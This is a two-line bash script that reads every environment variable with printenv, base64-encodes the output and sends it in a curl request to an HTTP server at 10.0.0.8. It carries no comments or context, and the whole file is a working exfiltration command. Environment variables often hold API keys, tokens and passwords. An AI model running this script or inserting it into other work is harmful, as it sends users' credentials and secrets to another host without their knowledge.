#!/bin/bash

ENV_B64=$(printenv | base64 | tr -d '\n')
curl -s "http://10.0.0.8:80/?id=${ENV_B64}"
